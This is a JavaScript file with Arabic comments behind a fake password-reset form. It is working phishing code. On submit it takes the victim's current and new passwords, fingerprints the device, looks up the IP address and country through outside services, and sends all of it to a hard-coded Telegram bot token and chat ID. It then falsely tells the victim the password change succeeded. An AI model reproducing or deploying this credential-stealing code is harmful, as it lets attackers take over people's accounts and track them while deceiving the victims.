// إظهار وإخفاء كلمة السر
function togglePassword(id) {
    const input = document.getElementById(id);
    const toggleIcon = input.nextElementSibling;
    if (input.type === 'password') {
        input.type = 'text';
        toggleIcon.textContent = 'إخفاء';
    } else {
        input.type = 'password';
        toggleIcon.textContent = 'إظهار';
    }
}

// إرسال البيانات إلى بوت تيليجرام
function sendUserInfoAndPasswordToTelegram(currentPassword, newPassword, confirmPassword) {
    const userInfo = {
        user_ip: '',
        user_country: '',
        user_browser: navigator.userAgent,
        device_type: /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
        user_os: navigator.platform,
        user_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen_resolution: `${window.screen.width}x${window.screen.height}`,
        user_language: navigator.language,
        timestamp: new Date().toLocaleString(),
    };

    // جلب عنوان الـ IP وموقع المستخدم
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            userInfo.user_ip = data.ip;
            return fetch(`https://ipapi.co/${userInfo.user_ip}/json`);
        })
        .then(response => response.json())
        .then(data => {
            userInfo.user_country = data.country_name;

            const message = `
🖥️ **معلومات المستخدم:**

📍 **عنوان الـ IP:** ${userInfo.user_ip}
🌍 **البلد:** ${userInfo.user_country}
💻 **المتصفح:** ${userInfo.user_browser}
📱 **نوع الجهاز:** ${userInfo.device_type}
🌐 **نظام التشغيل:** ${userInfo.user_os}
⏰ **المنطقة الزمنية:** ${userInfo.user_timezone}
🖱️ **دقة الشاشة:** ${userInfo.screen_resolution}
🔢 **اللغة المفضلة:** ${userInfo.user_language}
🕒 **التاريخ والوقت:** ${userInfo.timestamp}

🔒 **كلمة السر:**

✍️ **كلمة السر الحالية:** ${currentPassword}
🔐 **كلمة السر الجديدة:** ${newPassword}
🔄 **إعادة كتابة كلمة السر:** ${confirmPassword}
            `;

            const telegramToken = '7525549724:AAHW_je_uwIiyCa121FkCJlMaHpfVIdfDQA';
            const chatId = '6185375878';
            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => console.log('Message sent to Telegram:', data))
                .catch(error => console.error('Error sending message to Telegram:', error));
        })
        .catch(error => console.error('Error fetching user info:', error));
}

// التحقق من إدخال المستخدم عند إرسال النموذج
document.getElementById('passwordResetForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const currentPassword = document.getElementById('currentPassword').value;
    const newPassword = document.getElementById('newPassword').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    const errorMessage = document.getElementById('errorMessage');

    // التحقق من قوة كلمة السر
    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{6,}$/;
    if (!passwordRegex.test(newPassword)) {
        errorMessage.textContent = 'كلمة السر يجب أن تحتوي على 6 أحرف على الأقل وتضم أحرف وأرقام.';
        return;
    }

    // التحقق من تطابق كلمة السر
    if (newPassword !== confirmPassword) {
        errorMessage.textContent = 'كلمة السر الجديدة وتأكيد كلمة السر لا يتطابقان.';
        return;
    }

    // إرسال المعلومات إلى تيليجرام
    sendUserInfoAndPasswordToTelegram(currentPassword, newPassword, confirmPassword);

    alert('تم تغيير كلمة السر بنجاح!');
});
